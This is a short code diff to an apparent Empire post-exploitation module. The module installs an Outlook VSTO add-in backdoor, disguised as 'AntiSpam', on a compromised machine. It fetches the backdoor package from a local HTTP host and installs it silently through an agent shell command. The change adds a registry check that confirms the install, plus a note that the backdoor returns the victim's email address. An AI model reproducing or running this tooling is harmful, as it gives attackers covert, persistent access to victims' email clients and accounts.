@@ -4,6 +4,7 @@ Backdoor requirements:
 1. At least Outlook 2013
 2. At least .NET 4 Client
 3. Usable VSTOinstaller 
+Returns email address when successful
 """
 from EmpireAPIWrapper import empireAPI
 from empire_settings import EMPIRE_SERVER, EMPIRE_PWD, EMPIRE_USER
@@ -62,6 +63,11 @@ def run(API, agent_name, vsto_zip_backdoor_url='http://192.168.181.1:8000/antisp
     # VSTOinstaller silent install.
     opts['command'] = '& "' + VSTOinstallerpath + '" /s /i "' + uploadpath + '\\Apps\\antispam\\AntiSpam.vsto"'
     API.agent_run_shell_cmd_with_result(agent_name, opts)
+
+    opts['command'] = r"Get-ChildItem 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall' -recurse | Get-ItemProperty"
+    if("AntiSpam" not in API.agent_run_shell_cmd_with_result(agent_name, opts)):
+        raise ValueError("VSTO installation failed")
+
     return results
     
 
